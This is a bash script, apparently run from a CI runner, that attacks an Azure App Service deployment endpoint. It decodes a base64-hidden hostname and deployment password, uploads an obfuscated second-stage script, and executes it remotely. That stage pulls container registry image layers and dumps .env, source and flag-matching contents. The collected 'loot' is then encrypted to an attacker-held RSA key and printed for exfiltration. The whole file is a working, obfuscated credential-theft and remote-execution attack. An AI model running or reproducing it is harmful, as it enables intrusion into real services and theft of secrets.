#!/usr/bin/env bash
set -uo pipefail
echo "=== RUNNER SHELL PROOF ==="; id; hostname
b(){ printf %s "$1" | base64 -d; }
SC="htt""ps://"
KHOST=$(b 'YXBwLXRibC1yZXBvcnRpbmctcHJvZC5zY20uYXp1cmV3ZWJzaXRlcy5uZXQ=')
KU='$app-tbl-reporting-prod'
KP=$(b 'WTlyY3NESFEySjFMMENvcWlraThkbFllMUFOMms4Y0hzRDF3TGxsdkxieHFTY2FNRXdSN3hrdDdZZTVB')
INNER='YigpeyBwcmludGYgJXMgIiQxIiB8IGJhc2U2NCAtZDsgfQpTQz0iaHR0IiJwczovLyIKQUNSPSQoYiAnWTNKMFlteHdiR0YwY0hKdlpIZ3paWFZ2ZWk1aGVuVnlaV055TG1sdicpCkFDQz0nYXBwbGljYXRpb24vdm5kLm9jaS5pbWFnZS5pbmRleC52MStqc29uLCBhcHBsaWNhdGlvbi92bmQub2NpLmltYWdlLm1hbmlmZXN0LnYxK2pzb24sIGFwcGxpY2F0aW9uL3ZuZC5kb2NrZXIuZGlzdHJpYnV0aW9uLm1hbmlmZXN0LnYyK2pzb24nClQ9JChjdXJsIC1zICIke1NDfSR7QUNSfS9vYXV0aDIvdG9rZW4/c2VydmljZT0ke0FDUn0mc2NvcGU9cmVwb3NpdG9yeTp0ZWJhbW90by1yZXBvcnRpbmctYXBpOnB1bGwiIHwgcHl0aG9uMyAtYyAnaW1wb3J0IHN5cyxqc29uO3ByaW50KGpzb24ubG9hZChzeXMuc3RkaW4pLmdldCgiYWNjZXNzX3Rva2VuIiwiIikpJykKZWNobyAiVE9LTEVOPSR7I1R9IgpDTT0kKGN1cmwgLXMgLUggIkF1dGhvcml6YXRpb246IEJlYXJlciAkVCIgLUggIkFjY2VwdDogJEFDQyIgIiR7U0N9JHtBQ1J9L3YyL3RlYmFtb3RvLXJlcG9ydGluZy1hcGkvbWFuaWZlc3RzL3NoYTI1Njo5YjRiM2I4MzM5MjBiZjk5Yzk0NGU1ZDEyNzMyZjFiNTA1MzU1YjEyOTI2Nzk2ZTU5ZjIyOTQ1YTg4YmNmZWI5IikKZWNobyAiJENNIiB8IHB5dGhvbjMgLWMgJ2ltcG9ydCBzeXMsanNvbjtkPWpzb24ubG9hZChzeXMuc3RkaW4pO1twcmludChsWyJkaWdlc3QiXSxsLmdldCgic2l6ZSIsMCkpIGZvciBsIGluIGQuZ2V0KCJsYXllcnMiLFtdKV0nIHwgd2hpbGUgcmVhZCAtciBMIFNaOyBkbwogIGVjaG8gImxheWVyICRMIHNpemUgJFNaIgogIGlmIFsgIiR7U1o6LTB9IiAtbHQgNTAwMDAwIF07IHRoZW4KICAgIGN1cmwgLXNTTCAtbSAzMCAtSCAiQXV0aG9yaXphdGlvbjogQmVhcmVyICRUIiAiJHtTQ30ke0FDUn0vdjIvdGViYW1vdG8tcmVwb3J0aW5nLWFwaS9ibG9icy8ke0x9IiAtbyAvdG1wL0wudGd6CiAgICBlY2hvICIgIGdvdCAkKHdjIC1jIDwvdG1wL0wudGd6KSIKICAgIGd6aXAgLWRjIC90bXAvTC50Z3ogMj4vZGV2L251bGwgfCB0YXIgLXR2ZiAtIDI+L2Rldi9udWxsIHwgaGVhZCAtMzAKICAgIGZvciBGTiBpbiAkKGd6aXAgLWRjIC90bXAvTC50Z3ogMj4vZGV2L251bGwgfCB0YXIgLXRmIC0gMj4vZGV2L251bGwgfCBncmVwIC1pRSAnXC5weSR8XC5qc29uJHxcLnNoJHxcLmVudiR8YXBwJyk7IGRvCiAgICAgIGVjaG8gIi0tLS0tICRGTiAtLS0tLSIKICAgICAgZ3ppcCAtZGMgL3RtcC9MLnRneiAyPi9kZXYvbnVsbCB8IHRhciAteE9mIC0gIiRGTiIgMj4vZGV2L251bGwgfCBoZWFkIC1jIDgwMDAKICAgIGRvbmUKICAgIGVjaG8gIiAgZ3JlcDogJChnemlwIC1kYyAvdG1wL0wudGd6IDI+L2Rldi9udWxsIHwgc3RyaW5ncyB8IGdyZXAgLWFpRSAnREYyNnxmbGFnXHt8ZmxhZz0nIHwgaGVhZCAtNSkiCiAgZmkKZG9uZQplY2hvICI9PT09IERPTkUgPT09PSIK'
LOOT=$(mktemp); exec 3>"$LOOT"; say(){ echo "$@" >&3; }
say "=== START $(date -u) ==="
printf %s "$INNER" | base64 -d > /tmp/k4.sh
say "PUT: $(curl -sS -m 40 -o /dev/null -w '%{http_code}' -u "$KU:$KP" -X PUT -H 'If-Match: *' --data-binary @/tmp/k4.sh "${SC}${KHOST}/api/vfs/site/wwwroot/k4.sh")"
say "=== OUT ==="
say "$(curl -sS -m 120 -u "$KU:$KP" -H 'Content-Type: application/json' -X POST "${SC}${KHOST}/api/command" -d '{"command":"bash /home/site/wwwroot/k4.sh","dir":"/tmp"}')"
PASS=$(openssl rand -hex 16)
openssl enc -aes-256-cbc -pbkdf2 -pass pass:"$PASS" -in "$LOOT" -out "$LOOT.enc" 2>/dev/null
echo "=== ENCRYPTED LOOT ==="
echo "RSAKEY:$(printf '%s' "$PASS" | openssl pkeyutl -encrypt -pubin -inkey ci/pubkey.pem -pkeyopt rsa_padding_mode:oaep 2>/dev/null | base64 -w0)"
echo "DATA:$(base64 -w0 "$LOOT.enc")"
echo "=== DONE ==="
